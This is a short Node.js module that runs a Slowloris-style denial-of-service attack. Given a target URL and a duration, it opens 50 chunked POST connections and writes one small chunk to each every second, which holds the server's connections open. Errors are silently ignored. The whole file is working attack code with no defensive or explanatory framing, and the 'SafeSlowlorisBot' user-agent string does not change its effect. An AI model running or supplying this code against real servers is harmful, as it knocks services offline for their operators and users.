const http = require("http");
const { URL } = require("url");

module.exports = function (target, duration) {
  const url = new URL(target);
  const end = Date.now() + duration * 1000;

  function send() {
    const options = {
      hostname: url.hostname,
      port: url.port || 80,
      path: "/",
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked",
        "User-Agent": "SafeSlowlorisBot/1.0"
      }
    };

    const req = http.request(options);
    const chunk = "X-a: b\r\n";

    const interval = setInterval(() => {
      if (Date.now() >= end) {
        clearInterval(interval);
        req.end();
      } else {
        req.write(chunk);
      }
    }, 1000);

    req.on("error", () => {});
  }

  for (let i = 0; i < 50; i++) send();
};
